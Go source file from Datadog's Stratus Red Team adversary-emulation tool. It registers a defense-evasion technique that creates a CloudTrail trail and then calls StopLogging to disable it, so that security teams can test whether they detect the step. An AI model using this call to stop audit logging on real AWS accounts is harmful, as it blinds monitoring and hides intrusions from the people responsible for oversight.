package aws

import (
	"context"
	_ "embed"
	"errors"
	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/cloudtrail"
	"github.com/datadog/stratus-red-team/internal/providers"
	"github.com/datadog/stratus-red-team/pkg/stratus"
	"github.com/datadog/stratus-red-team/pkg/stratus/mitreattack"
	"log"
)

//go:embed main.tf
var tf []byte

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:                 "aws.defense-evasion.stop-cloudtrail",
		FriendlyName:       "Stop a CloudTrail Trail",
		Platform:           stratus.AWS,
		MitreAttackTactics: []mitreattack.Tactic{mitreattack.DefenseEvasion},
		Description: `
Stops a CloudTrail trail from logging.

Warm-up: Creates a CloudTrail trail.

Detonation: Calls cloudtrail:StopLogging
`,
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
	})
}

func detonate(params map[string]string) error {
	cloudtrailClient := cloudtrail.NewFromConfig(providers.AWS().GetConnection())
	trailName := params["cloudtrail_trail_name"]

	log.Println("Stopping CloudTrail trail " + trailName)

	_, err := cloudtrailClient.StopLogging(context.Background(), &cloudtrail.StopLoggingInput{
		Name: aws.String(trailName),
	})

	if err != nil {
		return errors.New("unable to stop CloudTrail logging: " + err.Error())
	}

	return nil
}
